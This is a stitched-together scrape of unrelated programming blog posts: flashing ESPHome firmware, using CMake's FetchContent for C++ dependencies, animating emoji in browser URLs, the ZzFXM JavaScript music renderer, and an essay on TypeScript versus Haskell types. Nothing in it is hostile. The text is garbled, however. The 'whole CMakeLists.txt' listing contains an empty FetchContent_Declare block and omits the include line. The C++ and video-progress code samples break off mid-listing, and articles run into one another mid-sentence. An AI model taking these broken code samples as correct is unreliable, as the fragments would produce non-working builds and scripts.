Be sure to check the <a href="https://esphome.io/devices/nodemcu_esp8266.html">documentation</a> for the specific board you’re using, and connect the pins correctly.

Unfortunately, this doesn’t work for the initial flash. For this, we have to download the firmware and flash it ourselves.</p><p>Before the firmware can be flashed, it must be compiled. This takes the configuration yaml and turns it into a firmware file. To do this, click the 3 dots on the relevant device card and select “Compile”. This will take some time (30 seconds or so), after which you’ll be presented with <code>INFO Successfully compiled program.</code>. At this point, you can click “Download Binary” in the bottom right of the popup to download the <code>.bin</code> firmware.</p><p>The firmware can then be flased using the <a href="https://esphome.io/guides/faq.html#esphome-flasher"><code>esphome-flasher</code></a> utility (available on the <a href="https://aur.archlinux.org/packages/esphome-flasher">AUR</a>). Connect your board over USB, select both it and the downloaded firmware in the flasher UI and select “Flash ESP”.

<![CDATA[Easy dependency management for C++ with CMake's FetchContent]]>

August 15, 2020 | https://bewagner.github.io/programming/2020/05/02/cmake-fetchcontent/ | <a href="https://web.archive.org/web/*/https://bewagner.github.io/programming/2020/05/02/cmake-fetchcontent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p>In this post, we will talk about dependency management in C++. In particular, we introduce <code>FetchContent</code>, a CMake feature that should get more love!</p>

<p>We start with an overview of dependency management for C++ applications.</p>

<h3 id="git-submodules">Git submodules</h3>

<p>In the past, my default was to add each dependency as a git submodule.
For dependencies with a modern CMake setup, this is enough to make it available to your project.</p>

<p>But what I always disliked about this approach, is that it requires each user to run</p>
<div><div><pre><code>$ git submodule update --init
</code></pre></div></div>
<p>before building the code. I like to make things easy on people using my code. Thus I’m always on the lookout for a way to get rid of running any extra commands. Also, I have caught myself forgetting to run <code>git submodule update --init</code> many times already.</p>

<h3 id="copying-the-code-into-your-repository">Copying the code into your repository</h3>
<p>Of course one can also copy the whole source code of the dependency into the repository of the project. Yet, in my view, this is inferior to submodules. Updating dependencies becomes complicated. And, depending on how big your dependencies are, this will bloat your repository.</p>

<h3 id="conan-and-other-package-managers">Conan (and other package managers)</h3>

<p>Another option is using a package manager like <a href="https://conan.io/">conan</a>.
I found them an adequate solution for bigger projects. They’re also nice when you have dependencies that take very long to build (I’m looking at you OpenCV! <img title=":sleeping:" alt=":sleeping:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f634.png" height="20" width="20"><img title=":hourglass_flowing_sand:" alt=":hourglass_flowing_sand:" src="https://github.githubassets.com/images/icons/emoji/unicode/23f3.png" height="20" width="20">).<br>
But for your small side project that needs two or three libraries from Github, it’s often too much effort.</p>

<p>My main critique point is that the package manager itself becomes a dependency. Everyone that wants to build your project has install the correct version. If you’re using CI, you have to set up everything on the build server as well, which can be a pain sometimes.</p>

<h2 id="can-cmake-help-us-here">Can CMake help us here?</h2>
<p>Younger languages like Rust and Go incorporated package management in the build system.
This makes for a nicer developer experience as one does not have to choose which package manager to use. Also, packages are by default set up for the languages built-in package manager.</p>

<p>With this in mind, it’s natural to look towards CMake for a solution. I was excited to hear that CMake introduced a module called <a href="https://cmake.org/cmake/help/latest/module/ExternalProject.html"><code>ExternalProject</code></a> in version 3.0. <code>ExternalProject</code> wraps dependencies into a CMake target and allows managing foreign code from your <code>CMakeLists.txt</code>.</p>

<p>To use it, one must add a target via <code>ExternalProject_Add()</code>. CMake will then run the following steps for this target.</p>

<p><code>DOWNLOAD</code></p>

<p>Download the dependency. Here one can use a version control system or download from an URL.</p>

<p><code>UPDATE</code></p>

<p>Update the downloaded code if anything changed since the last CMake run.</p>

<p><code>CONFIGURE</code></p>

<p>Configure the project code.</p>

<p><code>BUILD</code></p>

<p>Build the dependencies code.</p>

<p><code>INSTALL</code></p>

<p>Install the built code into a specified directory.</p>

<p><code>TEST</code> (optional)</p>

<p>Run tests.</p>

<p>All the above commands are configurable. 
<code>ExternalProject</code> also allows for custom steps.
For more information, have a look at the <a href="https://cmake.org/cmake/help/latest/module/ExternalProject.html#module:ExternalProject">documentation</a>.</p>

<h3 id="so-is-this-the-solution">So, is this the solution?</h3>

<p>After playing around with it for a little bit, I found that <strong><code>ExternalProject</code> is not what I was looking for.</strong> <img title=":pensive:" alt=":pensive:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f614.png" height="20" width="20"></p>

<p>The reason is that when using <code>ExternalProject</code>, all its steps will run at build time.
This means that CMake downloads and builds your dependencies after the generation step.
So your dependencies will not be available yet when CMake configures your project.</p>

<h3 id="will-we-have-to-stick-to-submodules-then">Will we have to stick to submodules then?</h3>

<p>No, we won’t!</p>

<p>With version 3.11 CMake introduced a new module: <a href="https://cmake.org/cmake/help/latest/module/FetchContent.html"><code>FetchContent</code></a>.
The module offers the same functionality as <code>ExternalProject</code> but will build and install dependencies at configure time. 
That means we can use it to manage our C++ project dependencies from the <code>CMakeLists.txt</code> file! <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"> <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"> <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"></p>

<h2 id="how-to-use-fetchcontent">How to use <code>FetchContent</code>
</h2>

<p>In this <a href="https://github.com/bewagner/fetchContent_example">repository</a>, I prepared an example. It uses <code>FetchContent</code> to include the libraries’ <a href="https://github.com/onqtam/doctest">doctest</a> and <a href="https://github.com/ericniebler/range-v3">range-v3</a>.
CMake will download and build the dependencies.
Very convenient!
I will explain how everything works below. Make sure you get the <a href="https://github.com/bewagner/fetchContent_example">code</a> to play around with it.</p>

<p>We begin by creating a regular CMake project.
The <code>FetchContent</code> API got a makeover that makes usage easier in version 3.14.
Thus this is the least version we need.
Then we include the <code>FetchContent</code> module.</p>

<figure><pre><code data-lang="cmake"><span>cmake_minimum_required</span><span>(</span>VERSION 3.14<span>)</span>
<span>project</span><span>(</span>fetchContent_example CXX<span>)</span>

<span>include</span><span>(</span>FetchContent<span>)</span></code></pre></figure>

<p>We register each dependency with a call to <code>FetchContent_Declare()</code>. 
When making this call, you can customize how your dependency is loaded.
<code>FetchContent</code> understands almost the same options as <code>ExternalProject</code>. 
But the options related to <code>CONFIGURE</code>, <code>BUILD</code>, <code>INSTALL</code>, and <code>TEST</code> are disabled.</p>

<p>We declare two targets, one for <code>doctest</code> and one for <code>range-v3</code>.
CMake downloads both libraries via their git repository.</p>

<p>The parameter <code>GIT_TAG</code> specifies the commit in the dependencies history we use. 
One can also use git branch names or tags here. 
Yet, new commits can change what the branch is pointing to. This might affect the reproducibility of your project.
So the CMake documentation discourages using branch names or tags.</p>

<figure><pre><code data-lang="cmake"><span>FetchContent_Declare</span><span>(</span>
        DocTest
        GIT_REPOSITORY <span>"https://github.com/onqtam/doctest"</span>
        GIT_TAG <span>"932a2ca50666138256dae56fbb16db3b1cae133a"</span>
<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
        Range-v3
        GIT_REPOSITORY <span>"https://github.com/ericniebler/range-v3"</span>
        GIT_TAG <span>"4d6a463bca51bc316f9b565edd94e82388206093"</span></code></pre></figure>

<p>Next, we call <code>FetchContent_MakeAvailable()</code>. 
This call makes sure CMake downloads our dependencies and adds their directories.</p>

<figure><pre><code data-lang="cmake"><span>FetchContent_MakeAvailable</span><span>(</span>DocTest Range-v3<span>)</span></code></pre></figure>

<p>Finally, we can add an executable and link to the included packages. 
CMake has taken over all the heavy lifting!</p>

<figure><pre><code data-lang="cmake"><span>add_executable</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> src/main.cpp<span>)</span>
<span>target_link_libraries</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> doctest range-v3<span>)</span></code></pre></figure>

<p>Using git repositories is the most convenient way of including dependencies with <code>FetchContent</code>. 
But, if the code you depend on is not a git repository, you can customize <code>FetchContent</code> to work with other sources. 
Have a look at the <a href="https://cmake.org/cmake/help/latest/module/ExternalProject.html#module:ExternalProject">documentation of <code>ExternalProject</code></a>.
It explains all parameters.</p>

<p>The whole <code>CMakeLists.txt</code> file will look like this.</p>

<figure><pre><code data-lang="cmake"><span>cmake_minimum_required</span><span>(</span>VERSION 3.14<span>)</span>
<span>project</span><span>(</span>fetchContent_example CXX<span>)</span>

<span>FetchContent_Declare</span><span>(</span>

<span>)</span>
<span>FetchContent_Declare</span><span>(</span>
        Range-v3
        GIT_REPOSITORY <span>"https://github.com/ericniebler/range-v3"</span>
        GIT_TAG <span>"4d6a463bca51bc316f9b565edd94e82388206093"</span>
<span>)</span>

<span>FetchContent_MakeAvailable</span><span>(</span>DocTest Range-v3<span>)</span>

<span>add_executable</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> src/main.cpp<span>)</span>
<span>target_link_libraries</span><span>(</span><span>${</span><span>PROJECT_NAME</span><span>}</span> doctest range-v3<span>)</span></code></pre></figure>

<p>After setting everything up in CMake, we can use the packages in our source code. 
Below is a small test program that makes use of both included libraries.</p>

<figure><pre><code data-lang="c++"><span>#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN

<h2 id="what-to-watch-out-for">What to watch out for</h2>
<p>Here are some things to keep in mind when using <code>FetchContent</code>.</p>

<h4 id="downloading-requires-an-internet-connection">Downloading requires an internet connection</h4>
<p>Of course, you have to be online for first downloading your dependencies. Compared to using submodules, this requirement is now hidden. So you might forget about it when building your code. 
To mitigate this problem, there is a set of options.</p>
<ul>
  <li>
<code>FETCHCONTENT_FULLY_DISCONNECTED=ON</code> will skip the <code>DOWNLOAD</code> and <code>UPDATE</code> steps</li>
  <li>
<code>FETCHCONTENT_UPDATES_DISCONNECTED=ON</code> will skip the <code>UPDATE</code> step</li>
</ul>

<h4 id="output-can-become-pretty-verbose">Output can become pretty verbose</h4>
<p><code>FetchContent</code> will log all its steps.
That’s why console output can become hard to read. 
To mute all output set <code>FETCHCONTENT_QUIET</code> to <code>ON</code>.</p>

<h4 id="the-library-has-to-be-installable">The library has to be installable</h4>
<p>A problem that I ran into quite often is that the dependency I wanted to use was not installable. Every once in a while you will come across libraries that are missing the call to <code>install()</code> in their <code>CMakeLists.txt</code>. In this case, <code>FetchContent</code> does not know how to copy the built code into the install folder and will fail. In this case, consider adding the <code>install()</code> calls and creating a PR.</p>

<p><code>FetchContent</code> works best with CMake based dependencies. I haven’t had a chance to test it with libraries that are not built with CMake. But I would expect that some extra configuration is necessary to make it work.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this blog post, we learned about <code>FetchContent</code>.
Now you know how to manage your dependencies from within your CMake setup. 
We saw how to use <code>FetchContent</code> to pull in dependencies for a small example project. 
And we read about some things to watch out for when using it.</p>

<p>I like this way of managing dependencies very much.
But of course, you can always mix different approaches and use what’s best for you!</p>

                <h4>by <a href="http://matthewrayfield.com/">Matthew Rayfield</a> on January 17th 2019</h4>

                <p>
                    <iframe width="560" height="315" src="https://www.youtube.com/embed/4YZt4HEv48Y" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen=""></iframe>

                <p>
                    You can use emoji (and other graphical unicode characters) in URLs. And wow is it great. But no one seems to do it.
                    Why? Perhaps emoji are too exotic for normie web platforms to handle? Or maybe they are avoided for fear of angering the SEO gods?
                </p>

                <p>
                    Whatever the reason, the overlapping portion on the Venn diagram of "It's Possible v.s. No One Is Doing It" is where my excitement usually lies.
                    So I decided to put a little time into the possibilities of graphical characters in URLs. Specifically, with the possibility for animating these characters by way of some Javascript.
                </p>

                <h2>Loopin'</h2>

                <p>
                    First off, make sure your page's Javascript code is being labelled as UTF-8 or you're gonna have a bad time putting emoji in your code at all. This can be accomplished via an HTTP header, or page META tag. There's a good chance you don't have to worry about this. But you can find more info about this here: <a href="https://flaviocopes.com/javascript-unicode/" target="_none">Unicode in Javascript by Flavio</a>
                </p>

                <p>
                    To achieve our desired outcome of emoji dancing like sugar plum fairies in our address bar, we need a loop.
                    And really, all we need is a loop. We start the loop, it loops, and we're happy. So here's our first loop, a spinning emoji moon.
                    I think when they added this sequence of emoji they must have had this in mind right?
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/moon.gif"></p>

                <pre>var f = ['🌑', '🌒', '🌓', '🌔', '🌝', '🌖', '🌗', '🌘'];

    function loop() {
        location.hash = f[Math.floor((Date.now()/100)%f.length)];

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="moon-check">Run Moon Code:</label> </p>

                <p>
                    You can click the toggle checkbox above to see the result of this loop in your URL bar.
                </p>

                <p>
                    If you don't like the spinning moons you can swap out that array with whatever emojis you want. Like a clock:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/clock.gif"></p>

                <pre>var f = ['🕐','🕑','🕒','🕓','🕔','🕕','🕖','🕗','🕘','🕙','🕚','🕛'];</pre>
                <p><label for="clock-check">Run Clock Code:</label> </p>

                <p>
                    This is a real simple example. Too simple really. So let's upgrade our loop so that it generates a string of multiple emoji! This time we're utilizing the emoji "skin tone modifiers" characters to make some color-changing babies:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/babies2.gif"></p>

                <pre>var e = ['🏻', '🏼', '🏽', '🏾', '🏿'];

    function loop() {
        var s = '',
            i, m;

        for (i = 0; i &lt; 10; i ++) {
            m = Math.floor(e.length * ((Math.sin((Date.now()/100) + i)+1)/2));
            s += '👶' + e[m];
        }

        location.hash = s;

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="babies-check">Run Babies Code:</label> </p>

                <p>
                    We use a sine wave controlled by time and position to select which color we want. This gives us a nice loopy color changing effect!
                </p>

                <p>
                    Or how about we revisit our moon spinner, spread it out, and make something resembling a loading indicator? Sure, let's do it:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/moons.gif"></p>

                <pre>var f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒'],
        d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        m = 0;

    function loop() {
        var s = '', x = 0;

        if (!m) {
            while (d[x] == 4) {
                x ++;
            }

            if (x &gt;= d.length) m = 1;
            else {
                d[x] ++;
            }
        }
        else {
            while (d[x] == 0) {
                x ++;
            }

            if (x &gt;= d.length) m = 0;
            else {
                d[x] ++;

                if (d[x] == 8) d[x] = 0;
            }
        }

        d.forEach(function (n) {
            s += f[n];
        });

        location.hash = s;

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="multi-moon-check">Run Multi-Moon Code:</label> </p>

                <h2>Exploring Other Characters</h2>

                <p>
                    But it's not just emoji that give us a means to pump graphics out of our URL bar. There's a whole boatload of unicode characters of interest to our goals.
                </p>

                <p>
                    Particularly interesting are the <a href="https://en.wikipedia.org/wiki/Box-drawing_character" target="_none">Box-drawing Characters</a>:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/box-characters.png"></p>

                <p>
                    Many of these lend themselves better to a two dimensional output. But they're still pretty good on the single line we have to play with.
                    For instance we can make a string of multiple height varied block characters and construct a nice little wave:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/wavy.gif"></p>

                <pre>function loop() {
        var i, n, s = '';

        for (i = 0; i &lt; 10; i++) {
            n = Math.floor(Math.sin((Date.now()/200) + (i/2)) * 4) + 4;

            s += String.fromCharCode(0x2581 + n);
        }

        window.location.hash = s;

        setTimeout(loop, 50);
    }

    loop();</pre>
                <p><label for="wavy-check">Run Wavy Code:</label> </p>

                <p>
                    I liked this look so much I put it up permanently at <a href="http://wavyurl.com/" target="_none">wavyurl.com</a>.
                </p>

                <p>
                    Using the variable width characters we can even wiggle on the horizontal, creating something like a progress bar:
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/progress.gif"></p>

                <pre>function loop() {
        var s = '',
            p;

        p = Math.floor(((Math.sin(Date.now()/300)+1)/2) * 100);

        while (p &gt;= 8) {
            s += '█';
            p -= 8;
        }
        s += ['⠀','▏','▎','▍','▌','▋','▊','▉'][p];

        location.hash = s;
        setTimeout(loop, 50);
    }</pre>
                <p><label for="progress-bar-check">Run Progress Bar Code:</label> </p>

                <p>
                    A progress bar huh? That's like, almost useful. Which brings me to...
                </p>

                <h2>Displaying Video Progress In The URL Bar</h2>

                <p>
                    In an attempt to reduce the frivolity in our little experiment, I came up with the idea to show a web video's progress in the URL.
                    I simply attach a function that renders our progress string to the "timeupdate" event for a video, and voila! A video progress indicator in the URL, complete with the time and duration!
                </p>

                <p><img src="https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/video-progress.gif"></p>

                <pre>var video;

                    Okay, calling this progress bar "useful" is a stretch. But if I squint, I can almost see a scenario where it would be useful to have this in a video sharing URL. Like YouTube has the option of creating a link to a video at a specific time. Might it not be cool to include a visual indication? Hmmm?
                </p>

                <p>
                    Maybe there is some more useful implementation of this "technology" that I haven't come up with. I'll keep thinking on that. And hey, maybe you can come up with something?
                </p>

                <h2>One Last Thing</h2>

                <p>
                    You may be wondering why I used "location.hash =" instead of the newer and shinier HTML5 History API. Two reasons. One solvable. The other less so. Both inconvenient.
                </p>

                <p>
                    Issue 1 is also a feature of the History API: It actually changes the whole URL path, not just the hash. So if I use the History API and change our page to "/🌑🌘🌗🌖🌕", it'll look nicer than having tacked on a #. But it also means my web server must be able to response to "/🌑🌘🌗🌖🌕", or the user will be out of luck if they refresh, or otherwise navigate to the modified URL. This is doable, but trickier than using "location.hash =" which doesn't require me to prepare the …</p></div></div></div>

  <h2>A tiny JavaScript music renderer for ZzFX.</h2>
  
  <p>Grab the code or contribute the project at <a href="https://github.com/keithclark/ZzFXM">GitHub</a>.
</p></header>

<section id="code">
  <h2>What is it?</h2>
  <p>ZzFXM is a tiny JavaScript function that generates stereo music tracks from patterns of note and instrument data.
  Instrument samples are created using a modified<sup>[<a href="#note-code-1">1</a>]</sup> version of the super-tiny <a href="https://github.com/KilledByAPixel/ZzFX">ZzFX</a> sound generator by <a href="https://twitter.com/KilledByAPixel">Frank Force</a>.
   </p><figure><pre><code>//! ZzFXM (v2.0.1) | (C) Keith Clark | MIT | https://github.com/keithclark/ZzFXM
zzfxM=(f,n,o,t=125)=&gt;{let z,e,l,r,g,h,x,a,u,c,d,i,m,p,G,M,R=[],b=[],j=[],k=0,q=1,s={},v=zzfxR/t*60&gt;&gt;2;for(;q;k++)R=[q=a=d=m=0],o.map((t,d)=&gt;{for(x=n[t][k]||[0,0,0],q|=!!n[t][k],G=m+(n[t][0].length-2-!a)*v,e=2,r=m;e&lt;x.length+(d==o.length-1);a=++e){for(g=x[e],u=c!=(x[0]||0)|g|0,l=0;l&lt;v&amp;&amp;a;l++&gt;v-99&amp;&amp;u?i+=(i&lt;1)/99:0)h=(1-i)*R[p++]/2||0,b[r]=(b[r]||0)+h*M-h,j[r]=(j[r++]||0)+h*M+h;g&amp;&amp;(i=g%1,M=x[1]||0,(g|=0)&amp;&amp;(R=s[[c=x[p=0]||0,g]]=s[[c,g]]||(z=[...f[c]],z[2]*=2**((g-12)/12),zzfxG(...z))))}m=G});return[b,j]}</code></pre><figcaption>The ZzFXM song generator function — 418 bytes (gzip)</figcaption></figure>   <p>ZzfxM was developed to create music for size-limited productions (i.e. js13k Games). The song format is loosely based on the tracker MOD format, using sequences of repeating patterns to create long songs from small chunks of music data.
  Songs are <em>highly</em> compressible. Once gzipped they're tiny — typically, a few hundred bytes.</p>


  <h2>Playing a song</h2>
  <p>Audio samples are compiled by passing instrument, pattern and sequence data to <code>zzfxM()</code>. The function returns a pair of arrays containing sample data for the left and right stereo channels.
  To play the rendered song, call <code>zzfxP()</code> using the generated sample data. The <code>zzfxM</code> function returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioBufferSourceNode">AudioBufferSourceNode</a>, which you can use to control the song (stop it, looping etc.).</p>

  <figure><pre><code>const songData = [
  [/* zzfx instruments */],
  [/* patterns */],
  [/* sequence */],
  /* speed (BPM) */
];

const buffer = zzfxM(...songData);    // Generate the sample data
const node = zzfxP(...buffer);        // Play the song
</code></pre><figcaption>Example code</figcaption></figure>
<ul>
    <li id="note-code-1">[1] The modifications allow ZzFX to create an array of audio data without immediately playing it.</li>

<p>Just what exactly <em>is</em> a type?</p>

<p>A common perspective is that types are <em>restrictions</em>. Static types restrict the set of values a variable may contain, capturing some subset of the space of “all possible values.” Under this worldview, a typechecker is sort of like an oracle, predicting which values will end up where when the program runs and making sure they satisfy the constraints the programmer wrote down in the type annotations. Of course, the typechecker can’t <em>really</em> predict the future, so when the typechecker gets it wrong—it can’t “figure out” what a value will be—static types can feel like self-inflicted shackles.</p>

<p>But that is not the <em>only</em> perspective. There is another way—a way that puts you, the programmer, back in the driver’s seat. You make the rules, you call the shots, you set the objectives. You need not be limited any longer by what the designers of your programming language decided the typechecker can and cannot prove. You do not serve the typechecker; the typechecker serves <em>you.</em></p>

<p>…no, I’m not trying to sell you a dubious self-help book for programmers who feel like they’ve lost control of their lives. If the above sounds too good to be true, well… I won’t pretend it’s all actually as easy as I make it sound. Nevertheless, it’s well within the reach of the working programmer, and most remarkably, all it takes is a change in perspective.</p>

<p>Let’s talk a little about TypeScript.</p>

<p>TypeScript is a <em>gradually-typed</em> language, which means it’s possible to mix statically- and dynamically-typed code. The original intended use case of gradual typing was to <em>gradually</em> add static types to an existing dynamically-typed codebase, which imposes some interesting design constraints. For one, a valid JavaScript program must also be a valid TypeScript program; for another, TypeScript must be accommodating of traditional JavaScript idioms.</p>

<p>Gradually typed languages like TypeScript are particularly good illustrations of the way type annotations can be viewed as constraints. A function with no explicit type declarations<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-1-return">1</a></sup> can accept <em>any</em> JavaScript value, so adding a type annotation fundamentally restricts the set of legal values.</p>

<p>Furthermore, languages like TypeScript tend to have subtyping. This makes it easy to classify certain types as “more restrictive” than others. For example, a type like <code>string | number</code> clearly includes more values than just <code>number</code>, so <code>number</code> is a more restrictive type—a <em>subtype</em>.</p>

<p>An exceptionally concrete way to illustrate this “types are restrictions” mentality is to write a function with an unnecessarily specific type. Here’s a TypeScript function that returns the first element in an array of numbers:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>getFirst</span><span>(</span><span>arr</span>: <span>number</span><span>[])</span><span>:</span> <span>number</span> <span>|</span> <span>undefined</span> <span>{</span>
  <span>return</span> <span>arr</span><span>[</span><span>0</span><span>];</span>
<span>}</span>
</pre></div>

</div>

<p>This function would work perfectly well given a list of strings, but if you write <code>getFirst(["hello", "world"])</code>, the typechecker will complain. Of course, in this example the restriction is thoroughly self-imposed—it would be easy to give this function a generic type—but sometimes it’s not quite so easy. For example, suppose we write a function where the return type depends upon the type of the argument:</p>

<div>
 <div>
  <pre><span></span><span>function</span> <span>emptyLike</span><span>(</span><span>val</span>: <span>number</span> <span>|</span> <span>string</span><span>)</span><span>:</span> <span>number</span> <span>|</span> <span>string</span> <span>{</span>
  <span>if</span> <span>(</span><span>typeof</span> <span>val</span> <span>===</span> <span>"number"</span><span>)</span> <span>{</span>
    <span>return</span> <span>0</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>return</span> <span>""</span><span>;</span>
  <span>}</span>
<span>}</span>
</pre></div>

</div>

<p>Now if we write <code>emptyLike(42) * 10</code>, the typechecker will once again complain, claiming the result could be a string—it can’t “figure out” that when we pass a number, we always get a number back.</p>

<p>When type systems are approached from this perspective, the result is often frustration. The programmer knows that the equivalent untyped JavaScript is perfectly well-behaved, so the typechecker comes off as being the highly unfortunate combination of stubborn yet dim-witted. What’s more, the programmer likely has little mental model of the typechecker’s internal operation, so when types like the above are inferred (not explicitly written), it can be unclear what solutions exist to make the error go away.</p>

<p>At this point, the programmer may give up. “Stupid typechecker,” they grumble, changing the return type of <code>emptyLike</code> to <code>any</code>. “If it can’t even figure this out, can it <em>really</em> be all that useful?”</p>

<p>Sadly, this relationship with the typechecker is all too common, and gradually-typed languages in particular tend to create a vicious cycle of frustration:</p>

<ul>
 <li>
  <p>Gradual type systems are intentionally designed to “just work” on idiomatic code as much as possible, so programmers may not think much about the types except when they get type errors.</p></li>
 <li>
  <p>Furthermore, many programmers using gradually-typed languages are already adept at programming in the underlying dynamically-typed language, so they have working mental models of program operation in terms of the dynamic semantics alone. They are much less likely to develop a rich mental model of the static semantics of the type system because they are used to reasoning without one.</p></li>

  <p>Gradually typed languages must support idioms from their dynamically-typed heritage, so they often include ad-hoc special cases (such as, for example, special treatment of <code>typeof</code> checks) that obscure the rules the typechecker follows and make them seem semi-magical.</p></li>
 <li>
  <p>Builtin types are deeply blessed in the type system, strongly encouraging programmers to embrace their full flexibility, but leaving little recourse when they run up against their limits.</p></li>
 <li>
  <p>All this frustration breeds a readiness to override the typechecker using casts or <code>any</code>, which ultimately creates a self-fulfilling prophecy in which the typechecker rarely catches any interesting mistakes because it has been so routinely disabled.</p></li></ul>

<p>The end result of all of this is a defeatist attitude that views the typechecker as a minor tooling convenience at best (i.e. a fancy autocomplete provider) or an active impediment at worst. Who can really blame them? The type system has (unintentionally of course) been designed in such a way so as to lead them into this dead end. The public perception of type systems settles into that of a strikingly literal nitpicker we endure rather than as a tool we actively leverage.</p>



<p>After everything I said above, it may be hard to imagine seeing types any other way. Indeed, through the lens of TypeScript, the “types are restrictions” mentality is incredibly natural, so much so that it seems self-evident. But let’s move away from TypeScript for a moment and focus on a different language, Haskell, which encourages a somewhat different perspective. If you aren’t familiar with Haskell, that’s alright—I’m going to try to keep the examples in this blog post as accessible as possible whether you’ve written any Haskell or not.</p>

<p>Though Haskell and TypeScript are both statically-typed—and both of their type systems are fairly sophisticated—Haskell’s type system is almost completely different philosophically:</p>

<ul>
 <li>
  <p>Haskell does not have subtyping,<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-2-return">2</a></sup> which means that every value belongs to exactly one type.</p></li>
 <li>
  <p>While JavaScript is built around a small handful of flexible builtin datatypes (booleans, numbers, strings, arrays, and objects), Haskell has essentially no blessed, built-in datatypes other than numbers. Key types such as booleans, lists, and tuples are ordinary datatypes defined in the standard library, no different from types users could define.<sup><a href="#2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-definition" name="2020-08-13-types-as-axioms-or-playing-god-with-static-types-footnote-3-return">3</a></sup></p></li>
 <li>
  <p>In particular, Haskell is built around the idea that datatypes can be defined with multiple <em>cases</em>, and branching is done via pattern-matching (more on this shortly).</p></li></ul>

<p>Let’s look at a basic Haskell datatype declaration. Suppose we want to define a type that represents a season:</p>

<div>
 <div>
  <pre><span></span><span>data</span> <span>Season</span> <span>=</span> <span>Spring</span> <span>|</span> <span>Summer</span> <span>|</span> <span>Fall</span> <span>|</span> <span>Winter</span>
</pre></div>

</div>

<p>If you are familiar with TypeScript, this may look rather similar to a union type; if you’re familiar with a C-family language, this may remind you more of an enum. Both are on the right track: this defines a new type named <code>Season</code> with four possible values, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>.</p>

<p>But what exactly <em>are</em> those values?</p>

<ul>
 <li>
  <p>In TypeScript, we’d represent this type with a union of strings, like this:</p>
  <div>
   <div>
    <pre><span></span><span>type</span> <span>Season</span> <span>=</span> <span>"spring"</span> <span>|</span> <span>"summer"</span> <span>|</span> <span>"fall"</span> <span>|</span> <span>"winter"</span><span>;</span>
</pre></div>

</div>
  <p>Here, <code>Season</code> is a type that can be one of those four strings, but nothing else.</p></li>
 <li>
  <p>In C, we’d represent this type with an enum, like this:</p>
  <div>
   <div>
    <pre><span></span><span>enum</span> <span>season</span> <span>{</span> <span>SPRING</span><span>,</span> <span>SUMMER</span><span>,</span> <span>FALL</span><span>,</span> <span>WINTER</span> <span>};</span>
</pre></div>

</div>
  <p>Here, <code>SPRING</code>, <code>SUMMER</code>, <code>FALL</code>, and <code>WINTER</code> are essentially defined to be global aliases for the integers <code>0</code>, <code>1</code>, <code>2</code>, and <code>3</code>, and the type <code>enum season</code> is essentially an alias for <code>int</code>.</p></li></ul>

<p>So in TypeScript, the values are strings, and in C, the values are numbers. What are they in Haskell? Well… they simply <em>are</em>.</p>

<p>The Haskell declaration invents four completely new constants out of thin air, <code>Spring</code>, <code>Summer</code>, <code>Fall</code>, and <code>Winter</code>. They aren’t aliases for numbers, nor are they symbols or strings. The compiler doesn’t expose anything about how it chooses to represent these values at runtime; that’s an implementation detail. In Haskell, <code>Spring</code> is now a value <em>distinct from all other values</em>, even if someone in a different module were to also use the name <code>Spring</code>. Haskell type declarations let us play god, creating something from nothing.</p>

<p>Since these values are totally unique, abstract constants, what can we actually do with them? The answer is one thing and <em>exactly</em> one thing: we can branch on them. For example, we can write a function that takes a <code>Season</code> as an argument and returns whether or not Christmas occurs during it:</p>

<div>
 <div>
  <pre><span></span><span>containsChristmas</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>Bool</span>
<span>containsChristmas</span> <span>season</span> <span>=</span> <span>case</span> <span>season</span> <span>of</span>
  <span>Spring</span> <span>-&gt;</span> <span>False</span>
  <span>Summer</span> <span>-&gt;</span> <span>True</span>  <span>-- southern hemisphere</span>
  <span>Fall</span>   <span>-&gt;</span> <span>False</span>
  <span>Winter</span> <span>-&gt;</span> <span>True</span>  <span>-- northern hemisphere</span>
</pre></div>

</div>

<p><code>case</code> expressions are, to a first approximation, a lot like C-style <code>switch</code> statements (though they can do a lot more than this simple example suggests). Using <code>case</code>, we can also define conversions from our totally unique <code>Season</code> constants to other types, if we want:</p>

<div>
 <div>
